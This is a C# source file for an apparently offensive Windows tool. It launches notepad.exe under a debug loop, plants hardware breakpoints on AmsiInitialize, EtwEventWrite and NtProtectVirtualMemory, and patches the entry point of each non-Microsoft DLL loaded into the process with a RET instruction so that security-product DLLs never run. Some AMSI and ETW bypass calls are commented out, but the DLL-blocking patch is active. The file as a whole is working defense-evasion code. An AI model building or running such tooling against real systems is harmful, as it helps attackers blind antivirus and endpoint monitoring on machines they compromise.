using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TempSharpBlock
{
    internal class Program
    {
        static IntPtr amsiInitalizePtr;
        static List<Tuple<long, long>> blockAddressRanges = new List<Tuple<long, long>>();
        static List<string> blockDllName = new List<string>();


        static Structs.DEBUG_EVENT GetDebugEvent(IntPtr nativeDebugEvent)
        {

            Structs.DEBUG_EVENT result = new Structs.DEBUG_EVENT();

            if (IntPtr.Size == 8)
            {
                Structs.DEBUG_EVENT64 DebugEvent64 = (Structs.DEBUG_EVENT64)Marshal.PtrToStructure(nativeDebugEvent, typeof(Structs.DEBUG_EVENT64));
                result.dwDebugEventCode = DebugEvent64.dwDebugEventCode;
                result.dwProcessId = DebugEvent64.dwProcessId;
                result.dwThreadId = DebugEvent64.dwThreadId;
                result.u = DebugEvent64.u;
            }
            else
            {
                result = (Structs.DEBUG_EVENT)Marshal.PtrToStructure(nativeDebugEvent, typeof(Structs.DEBUG_EVENT));
            }

            return result;
        }
        private static StructType GetStructureFromByteArray<StructType>(byte[] byteArray)
        {
            GCHandle pinnedArray = GCHandle.Alloc(byteArray, GCHandleType.Pinned);
            IntPtr intPtr = pinnedArray.AddrOfPinnedObject();
            StructType result = (StructType)Marshal.PtrToStructure(intPtr, typeof(StructType));
            pinnedArray.Free();
            return result;
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }


        static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address, int index)
        {
            if (IntPtr.Size != 8)
            {
                Structs.CONTEXT32 ctx = new Structs.CONTEXT32();
                ctx.ContextFlags = Structs.CONTEXT_FLAGS.CONTEXT_ALL;
                Structs.GetThreadContext(hThread, ref ctx);
                if (ctx.Eip != (ulong)address.ToInt64())
                {
                    ctx.Dr0 = (uint)address.ToInt32();
                    //Set bits 16-19 as 0, DR0 for execute HBP
                    ctx.Dr7 = (uint)SetBits((ulong)ctx.Dr7, 16, 4, 0);
                    //Set DR0 HBP as enabled
                    ctx.Dr7 = (uint)SetBits((ulong)ctx.Dr7, 0, 2, 3);
                    ctx.Dr6 = 0;
                }
                else
                {
                    // If our BP address matches the thread context address
                    // then we have hit the HBP, so we need to disable
                    // HBP and enabled single step so that we break at the
                    // next instruction and re-eable the HBP.
                    ctx.Dr0 = ctx.Dr6 = ctx.Dr7 = 0;
                    ctx.EFlags |= (1 << 8);
                }
                Structs.SetThreadContext(hThread, ref ctx);
            }
            else
            {
                Structs.CONTEXT64 ctx = new Structs.CONTEXT64();
                ctx.ContextFlags = Structs.CONTEXT64_FLAGS.CONTEXT64_ALL;
                Structs.GetThreadContext(hThread, ref ctx);
                if (ctx.Rip != (ulong)address.ToInt64())
                {
                    switch (index)
                    {
                        case 0:
                            ctx.Dr0 = (ulong)address.ToInt64();
                            break;
                        case 1:
                            ctx.Dr1 = (ulong)address.ToInt64();
                            break;
                        case 2:
                            ctx.Dr2 = (ulong)address.ToInt64();
                            break;
                        case 3:
                            ctx.Dr3 = (ulong)address.ToInt64();
                            break;
                    }

                    //Set bits 16-31 as 0, which sets
                    //DR0-DR3 HBP's for execute HBP
                    ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);

                    //Set DRx HBP as enabled for local mode
                    ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
                    ctx.Dr6 = 0;

                }

                Structs.SetThreadContext(hThread, ref ctx);
            }

        }
        static string GetFileName(IntPtr handle)
        {
            try
            {

                // Setup buffer to store unicode string
                int bufferSize = 0x1000;

                // Allocate unmanaged memory to store name
                IntPtr pFileNameBuffer = Marshal.AllocHGlobal(bufferSize);
                Structs.IO_STATUS_BLOCK ioStat = new Structs.IO_STATUS_BLOCK();

                Structs.NtStatus status = (Structs.NtStatus)Structs.NtQueryInformationFile(handle, ref ioStat, pFileNameBuffer, (int)bufferSize, Structs.FILE_INFORMATION_CLASS.FileNameInformation);

                // offset=4 seems to work...
                int offset = 4;
                long pBaseAddress = pFileNameBuffer.ToInt64();
                int strLen = Marshal.ReadInt32(pFileNameBuffer);

                // Do the conversion to managed type
                string fileName = System.Environment.SystemDirectory.Substring(0, 2) + Marshal.PtrToStringUni(new IntPtr(pBaseAddress + offset), strLen / 2);

                // Release
                Marshal.FreeHGlobal(pFileNameBuffer);

                return fileName;

            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace);
                return string.Empty;
            }
        }
        private static bool ShouldBlockDLL(string dllPath)
        {
            bool ShouldBlock = true;

            try
            {

                string dllName = Path.GetFileName(dllPath);
                if (blockDllName.Contains(dllName))
                    return true;

                FileVersionInfo dllVersionInfo = FileVersionInfo.GetVersionInfo(dllPath);
                if (dllVersionInfo.LegalCopyright.Contains("Microsoft"))
                {
                    ShouldBlock = false;
                }
                Console.WriteLine($"DllName: {dllName} DllLegalCopyRight: {dllVersionInfo.LegalCopyright} DllCompany Name : {dllVersionInfo.CompanyName} DllTrademarks: {dllVersionInfo.LegalTrademarks} DllProductName:{dllVersionInfo.ProductName} Pass:{!ShouldBlock}");
                if(dllVersionInfo.LegalCopyright == "" && dllVersionInfo.CompanyName == "")
                {
                    Console.WriteLine("pass");
                }
                
            }
            catch (Exception e)
            {
                Console.WriteLine($"[=] Failed to get file info for DLL {dllPath}, ignoring");
                ShouldBlock = false;
            }

            return ShouldBlock;
        }

        static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess)
        {

            long fileSize;
            uint returned = 0;
            string dllPath;

            if (!Structs.GetFileSizeEx(moduleHandle, out fileSize) || fileSize == 0)
            {
                return null;
            }

            IntPtr handle = Structs.CreateFileMapping(moduleHandle, IntPtr.Zero,
                Structs.FileMapProtection.PageReadonly | Structs.FileMapProtection.SectionImage, 0, 0, null);

            if (handle == IntPtr.Zero)
            {
                return null;
            }

            IntPtr mem = Structs.MapViewOfFile(handle, Structs.FileMapAccess.FileMapRead, 0, 0, UIntPtr.Zero);

            if (mem == IntPtr.Zero)
            {
                return null;
            }

            dllPath = GetFileName(moduleHandle);

            Structs.IMAGE_DOS_HEADER dosHeader = (Structs.IMAGE_DOS_HEADER)Marshal.PtrToStructure(mem, typeof(Structs.IMAGE_DOS_HEADER));
            Structs.IMAGE_FILE_HEADER fileHeader = (Structs.IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(mem.ToInt64() + dosHeader.e_lfanew), typeof(Structs.IMAGE_FILE_HEADER));

            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            IntPtr entryPoint;
            long sizeOfImage;
            if ((fileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) == IMAGE_FILE_32BIT_MACHINE)
            {
                Structs.IMAGE_OPTIONAL_HEADER32 optionalHeader = (Structs.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(Structs.IMAGE_FILE_HEADER))), typeof(Structs.IMAGE_OPTIONAL_HEADER32));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt32());
                sizeOfImage = optionalHeader.SizeOfImage;

            }
            else
            {
                Structs.IMAGE_OPTIONAL_HEADER64 optionalHeader = (Structs.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(Structs.IMAGE_FILE_HEADER))), typeof(Structs.IMAGE_OPTIONAL_HEADER64));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt64());
                sizeOfImage = optionalHeader.SizeOfImage;
            }

            if (ShouldBlockDLL(dllPath))
            {

                Tuple<long, long> addressRange = new Tuple<long, long>((long)imageBase, (long)imageBase + sizeOfImage);
                blockAddressRanges.Add(addressRange);

                Console.WriteLine($"[+] Blocked DLL {dllPath}");

                byte[] retIns = new byte[1] { 0xC3 };
                uint bytesWritten;

                Console.WriteLine("[+] Patching DLL Entry Point at 0x{0:x}", entryPoint.ToInt64());

                if (WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten))
                {
                    Console.WriteLine("[+] Successfully patched DLL Entry Point");
                }
                else
                {
                    Console.WriteLine("[!] Failed patched DLL Entry Point with error 0x{0:x}", Marshal.GetLastWin32Error());
                }
            }

            return dllPath.ToString();
        }
        static bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddress, byte[] data, int size, out uint bytesWritten)
        {

            IntPtr regionSize = (IntPtr)size;
            IntPtr protectionBase = baseAddress;
            uint oldProtect = 0;
            bytesWritten = 0;
            GCHandle pinnedArray = GCHandle.Alloc(data, GCHandleType.Pinned);
            IntPtr intptrData = pinnedArray.AddrOfPinnedObject();
            Structs.NtStatus result = Structs.NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, 0x40 /*RWX*/, ref oldProtect);
            if (result != 0)
            {
                throw new System.ComponentModel.Win32Exception((int)result);
            }
            result = Structs.NtWriteVirtualMemory(hProcess, baseAddress, intptrData, (uint)size, ref bytesWritten);

            if (result != 0)
            {
                throw new System.ComponentModel.Win32Exception((int)result);
            }
            result = Structs.NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, oldProtect, ref oldProtect);
            if (result != 0)
            {
                throw new System.ComponentModel.Win32Exception((int)result);
            }
            return result == 0;

        }

        static void Main(string[] args)
        {

            string program = Environment.SystemDirectory + Path.DirectorySeparatorChar + "notepad.exe";
            IntPtr amsiBase = Structs.LoadLibrary("amsi.dll");
            amsiInitalizePtr = Structs.GetProcAddress(amsiBase, "AmsiInitialize");

            IntPtr ntdllBase = Structs.LoadLibrary("ntdll.dll");
            IntPtr etwEventWritePtr = Structs.GetProcAddress(ntdllBase, "EtwEventWrite");
            IntPtr ntProtectVirtualMemoryPtr = Structs.GetProcAddress(ntdllBase, "NtProtectVirtualMemory");

            Console.WriteLine($"[+] in-proc amsi 0x{amsiBase.ToInt64():x16}");
            Console.WriteLine($"[+] in-proc ntdll 0x{ntdllBase.ToInt64():x16}");

            Structs.STARTUPINFOEX startupInfo = new Structs.STARTUPINFOEX();
            startupInfo.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
            uint launchFlags = Structs.DEBUG_PROCESS;
            /*startupInfo.StartupInfo.dwFlags = 0x00000101;
            launchFlags |= 0x08000000;*/

            Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();


            if (!Structs.CreateProcess(program, null, IntPtr.Zero, IntPtr.Zero, true, launchFlags, IntPtr.Zero, null, ref startupInfo, out pi))
            {
                Console.WriteLine($"[!] Failed to create process { (program) } with error {Marshal.GetLastWin32Error()}");
                return;
            }

            Console.WriteLine($"[+] Launched process { (program)} with PID {pi.dwProcessId}");
            bool bContinueDebugging = true;
            Dictionary<uint, IntPtr> processHandles = new Dictionary<uint, IntPtr>();
            Dictionary<uint, IntPtr> threadHandles = new Dictionary<uint, IntPtr>();

            while (bContinueDebugging)
            {
                IntPtr debugEventPtr = Marshal.AllocHGlobal(1024);
                bool bb = Structs.WaitForDebugEvent(debugEventPtr, 50000);
                UInt32 dwContinueDebugEvent = Structs.DBG_CONTINUE;
                if (bb)
                {
                    Structs.DEBUG_EVENT DebugEvent = GetDebugEvent(debugEventPtr);
                    switch (DebugEvent.dwDebugEventCode)
                    {

                        /* Uncomment if you want to see OutputDebugString output 
                        case WinAPI.OUTPUT_DEBUG_STRING_EVENT:
                            WinAPI.OUTPUT_DEBUG_STRING_INFO OutputDebugStringEventInfo = (WinAPI.OUTPUT_DEBUG_STRING_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.OUTPUT_DEBUG_STRING_INFO));
                            IntPtr bytesRead;
                            byte[] strData = new byte[OutputDebugStringEventInfo.nDebugStringLength];
                            WinAPI.ReadProcessMemory(pi.hProcess, OutputDebugStringEventInfo.lpDebugStringData, strData, strData.Length, out bytesRead);
                            Console.WriteLine(Encoding.ASCII.GetString(strData));
                            break;
                        */

                        case Structs.CREATE_PROCESS_DEBUG_EVENT:

                            Structs.CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfo = GetStructureFromByteArray<Structs.CREATE_PROCESS_DEBUG_INFO>(DebugEvent.u);
                            processHandles[DebugEvent.dwProcessId] = CreateProcessDebugInfo.hProcess;
                            threadHandles[DebugEvent.dwThreadId] = CreateProcessDebugInfo.hThread;

                            SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr, 0);

                            SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);

                            break;
                        case Structs.CREATE_THREAD_DEBUG_EVENT:
                            Structs.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = GetStructureFromByteArray<Structs.CREATE_THREAD_DEBUG_INFO>(DebugEvent.u);
                            threadHandles[DebugEvent.dwThreadId] = CreateThreadDebugInfo.hThread;

                            if (pi.dwProcessId == DebugEvent.dwProcessId)
                            {
                                    SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, amsiInitalizePtr, 0);

                                    SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);

                                    SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
                            }

                            break;
                        case Structs.EXIT_PROCESS_DEBUG_EVENT:
                            if (pi.dwProcessId == DebugEvent.dwProcessId)
                            {
                                bContinueDebugging = false;
                            }
                            break;
                        case Structs.LOAD_DLL_DEBUG_EVENT:
                            Structs.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = GetStructureFromByteArray<Structs.LOAD_DLL_DEBUG_INFO>(DebugEvent.u);
                            string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);

                            //Console.WriteLine($"[=] DLL Load: {dllPath}");

                            

                            break;

                        case Structs.EXCEPTION_DEBUG_EVENT:
                            Structs.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = GetStructureFromByteArray<Structs.EXCEPTION_DEBUG_INFO>(DebugEvent.u);

                            if (ExceptionDebugInfo.ExceptionRecord.ExceptionCode == Structs.EXCEPTION_SINGLE_STEP ||
                                   ExceptionDebugInfo.ExceptionRecord.ExceptionCode == Structs.EXCEPTION_BREAKPOINT)
                            {

                                //Check to see if the single step breakpoint is at AmsiInitalize
                                if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == amsiInitalizePtr)
                                {
                                    //It is, to update the thread context to return to caller with 
                                    //an invalid result
                                    //DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);

                                    //Set the hardware breakpoint again for AmsiInitalize
                                    SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], amsiInitalizePtr, 0);

                                    //check to see if we have hit our in-memory PE entry-point
                                }
                                else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == etwEventWritePtr)
                                {
                                    //We have hit EtwEventWrite so lets just return with a fake success result
                                    //OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new UIntPtr(0), 5);
                                }
                                else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == ntProtectVirtualMemoryPtr)
                                {
                                    //BlockVirtualProtect(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
                                    SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
                                }
                                else
                                {
                                    SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
                                }

                            }
                            else
                            {
                                dwContinueDebugEvent = Structs.DBG_EXCEPTION_NOT_HANDLED;
                            }

                            if (ExceptionDebugInfo.dwFirstChance == 0 && ExceptionDebugInfo.ExceptionRecord.ExceptionCode != Structs.EXCEPTION_SINGLE_STEP)
                            {
                                Console.WriteLine($"Exception 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionCode:x} occured at 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionAddress.ToInt64():x}");
                                for (int idx = 0; idx < ExceptionDebugInfo.ExceptionRecord.NumberParameters; ++idx)
                                {
                                    Console.WriteLine($"\tParameter: 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionInformation[idx]}");
                                }
                            }

                            break;
                    }

                    Structs.ContinueDebugEvent((uint)DebugEvent.dwProcessId,
                        (uint)DebugEvent.dwThreadId,
                        dwContinueDebugEvent);
                }
                if (debugEventPtr != null)
                    Marshal.FreeHGlobal(debugEventPtr);
            }



        }

    }
}

